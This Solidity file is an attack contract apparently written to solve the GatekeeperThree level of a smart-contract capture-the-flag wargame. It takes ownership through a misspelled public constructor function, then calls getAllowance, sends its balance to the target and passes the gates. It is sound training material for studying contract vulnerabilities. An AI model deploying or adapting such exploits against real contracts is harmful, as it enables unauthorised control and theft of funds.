// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IGatekeeperThree {
  function getAllowance(uint _password) external;
  function createTrick() external;
  function enter() external;
  function construct0r() external;
  function trick() external view returns (address);
}

contract GatekeeperThreeAttack {
  IGatekeeperThree gatekeeperThree;

  // Constructor to initialize the Gatekeeper contract
  constructor(address _gatekeeper) payable {
    require(_gatekeeper != address(0), "Invalid GatekeeperThree contract address");
    gatekeeperThree = IGatekeeperThree(_gatekeeper);
  }

   // Function that calls createTrick on the TrickEntrance contract
  function callCreateTrick() external {
    gatekeeperThree.createTrick();
  }
 function attack(uint _password) external {
    gatekeeperThree.construct0r();
    gatekeeperThree.getAllowance(_password);
    (bool success,) = address(gatekeeperThree).call{value: address(this).balance}("");
    require(success,"transfer failed");
    gatekeeperThree.enter();
    
  }

   function getTrickAddress() external view returns (address) {
    return gatekeeperThree.trick();
}
}